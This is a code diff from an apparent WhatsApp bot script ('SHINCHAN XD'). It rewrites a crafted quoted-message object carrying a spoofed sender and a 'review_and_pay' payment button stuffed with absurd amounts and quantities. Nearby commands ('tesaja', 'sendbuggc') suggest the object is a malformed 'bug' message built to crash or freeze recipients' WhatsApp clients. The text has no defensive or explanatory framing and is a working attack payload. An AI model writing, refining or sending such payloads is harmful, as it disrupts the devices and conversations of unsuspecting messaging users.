@@ -276,29 +276,26 @@ const fpayment = {
 }}}}
 const shinuwu = { 
 key: {
-fromMe: false,
-            participant: m.chat,
-            ...(from ? {
-               remoteJid: `0@s.whatsapp.net`
-            } : {})
-         },
-         message: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
+},
+'message': {
 "interactiveMessage": {
-"body": {
-"text": `${ownername}`,
+"header": {
 "hasMediaAttachment": [],
 "jpegThumbnail": thumb,
 },
 "nativeFlowMessage": {
 "buttons": [
-				{
+{
 "name": "review_and_pay",
-"buttonParamsJson": '{"currency":"IDR","total_amount":{"value":2023,"offset":100},"reference_id": "6348642505244872","order":{"status": "completed","items":[{"retailer_id": "6348642505244872","name": "","amount":{"value":10000,"offset":100},"quantity":7777777}]}}',
-mentions: []
+"buttonParamsJson": '{"currency":"USD","payment_configuration":"","payment_type":"","transaction_id":"","total_amount":{"value":879912500,"offset":100},"reference_id":"4N88TZPXWUM","type":"physical-goods","payment_method": "","order":{"status":"pending","description":"","subtotal":{"value":990000000,"offset":100},"tax":{"value":8712000,"offset":100},"discount":{"value":118800000,"offset":100},"shipping":{"value":500,"offset":100},"order_type":"ORDER","items":[{"retailer_id":"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0","name":"ShinChan","amount":{"value":1000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4","name":"Anak","amount":{"value":5000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3","name":"Ganteng","amount":{"value":4000000,"offset":100},"quantity":99}]},"additional_note":"anu"}',
+contextInfo:{mentionedJid:[sender]}
 }
 ]
 }
-}}}
+}
+}}
 //===================SHINCHAN XD=========================//
 if (vn) {
 let allct = await store.chats.all().map(v => v.id)
@@ -2383,7 +2380,7 @@ await sleep(60* secon)
 }
 break
 case 'tesaja': {
-conn.sendMessage(m.chat, { sticker : thumb }, { quoted: shinuwu })
+conn.sendMessage(m.chat, { sticker : thumb }, { quoted:shinuwu })
 }
 break
 case 'sendbuggc': {
